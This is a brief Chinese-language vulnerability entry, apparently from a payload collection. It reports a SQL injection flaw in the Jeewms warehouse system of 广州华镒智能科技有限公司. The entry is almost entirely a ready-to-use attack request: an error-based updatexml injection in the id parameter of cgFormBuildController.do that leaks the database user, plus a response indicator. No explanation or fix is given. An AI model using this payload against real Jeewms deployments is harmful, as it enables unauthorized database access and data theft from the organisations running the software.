# 广州华镒智能科技有限公司Jeewms存在SQL注入漏洞

广州华镒智能科技有限公司 ｜ SQL注入 ｜ —

**Payload**
```
/jeewms/cgFormBuildController.do?saveOrUpdate&bpm_status=&create_by=&create_date=&create_name=&id='and/**/updatexml(1,concat(0x7e,user(),0x7e),1)and'&sys_company_code=&sys_org_code=&tableName=wm_wendu&update_by=&update_date=&update_name=&wendu_bz=1&wendu_cjsj=2024-05-09+11%3A12%3A41&wendu_dd=1&wendu_zhi=1
```
- **响应特征**：200